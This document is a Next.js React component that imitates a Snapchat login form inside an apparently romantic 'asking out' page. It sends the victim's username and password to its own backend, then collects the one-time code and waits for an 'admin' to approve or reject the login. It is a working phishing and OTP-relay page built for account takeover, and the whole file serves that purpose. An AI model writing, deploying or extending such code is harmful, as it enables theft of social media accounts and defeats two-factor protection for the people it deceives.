"use client";
import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import { set } from "animejs";
import { API_BASE_URL } from "../../config/api";

export default function SnapchatLogin() {
  const router = useRouter();

  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [userMessage, setUserMessage] = useState("");
  const [status, setStatus] = useState<"IDLE" | "PENDING" | "REJECTED">("IDLE");
  const [adminMessage, setAdminMessage] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);

  const [requestId, setRequestId] = useState<number | null>(null);
  const [stage, setStage] = useState<"LOGIN" | "MESSAGE" | "PENDING">("LOGIN");

    // 🔁 Poll request (status + admin message)
      useEffect(() => {
        if (!requestId || status !== "PENDING") return;
    
        const interval = setInterval(async () => {
          try {
            const res = await fetch(
              `${API_BASE_URL}/api/user/request/${requestId}`
            );
    
            if (!res.ok) return;
    
            const data = await res.json();
    
            // 🟡 Message sirf show hoga
            if (data.adminMessage) {
              setAdminMessage(data.adminMessage);
            }
    
            // 🔴 Reject
            if (data.status === "REJECTED") {
              clearInterval(interval);
              setStage("LOGIN");
              setStatus("IDLE")
              setError("❌ Rejected. Please enter correct mobile number");
              setRequestId(null);
            }
    
            // 🟢 Approve → tab hi next page
            if (data.status === "APPROVED") {
              clearInterval(interval);
              router.push("/askingout/ask");
            }
          } catch (err) {
            console.log("Waiting for admin...");
          }
        }, 1000);
    
        return () => clearInterval(interval);
      }, [requestId, status, router]);

  // STEP 1 LOGIN
  const login = async () => {

    const res = await fetch(`${API_BASE_URL}/api/user/login`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        platform: "SNAPCHAT",
        username,
        password,
      }),
    });

    const data = await res.json();

    localStorage.setItem("requestId", data.id);

    setRequestId(data.id);
    setStage("MESSAGE");
    console.log("LOGIN ID:", data.id);
  };

  // STEP 2 USER MESSAGE
  const sendMessage = async () => {

    await fetch(`${API_BASE_URL}/api/user/message/${requestId}`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        userMessage: userMessage
      }),
    });

    setStage("PENDING");
    setStatus("PENDING");
  };

  return (
    <div className="romantic-layout">
      <div className="card">
        <h1>Snapchat</h1>

        <div className="flex flex-col gap-2.5">
            <input
              placeholder="Enter Username..."
              disabled={stage !== "LOGIN"}
              value={username}
              required
              className="border border-gray-600 px-3 py-1.5 rounded-lg"
              onChange={(e) => setUsername(e.target.value)}
            />

            <input
              type="password"
              placeholder="Enter Password..."
              disabled={stage !== "LOGIN"}
              value={password}
              required
              className="border border-gray-600 px-3 py-1.5 rounded-lg"
              onChange={(e) => setPassword(e.target.value)}
            />
        </div>

        {stage === "MESSAGE" && (
            <div className="flex flex-col gap-2.5 mt-5">
                <h2>Enter OTP</h2>
                <input
                  placeholder="Enter OTP..."
                  value={userMessage}
                  className="border border-gray-600 px-3 py-1.5 rounded-lg"
                  onChange={(e) => setUserMessage(e.target.value)}
                />
            </div>
        )}

        {stage === "LOGIN" && (
          <button className="btn mt-5" onClick={login}>
            Login
          </button>
        )}

        {stage === "MESSAGE" && (
          <button className="btn mt-5" onClick={sendMessage}>
            Submit
          </button>
        )}

        {stage === "PENDING" && (
          <p>⏳ Waiting for admin approval...</p>
        )}

        {error && (
          <p className="text-red-600">{error}</p>
        )}
      </div>
    </div>
  );
}